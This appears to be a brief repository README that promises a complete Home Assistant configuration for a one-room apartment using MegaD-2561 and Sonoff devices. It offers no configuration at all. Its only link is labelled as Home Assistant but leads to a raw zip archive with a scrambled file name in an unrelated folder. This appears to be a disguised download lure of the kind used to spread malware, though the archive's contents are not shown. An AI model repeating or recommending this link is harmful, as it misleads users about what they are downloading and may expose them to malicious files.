# Full automation of a one-room apartment :department_store: using Home Assistant, MegaD-2561 and Sonoff

The repository presents the complete configuration of [Home Assistant](https://raw.githubusercontent.com/OlegBON1/Home-Assistant_one-room-apartment/master/dogstone/room-one-Assistant-apartment-Home-v3.7.zip) for all devices in the apartment.
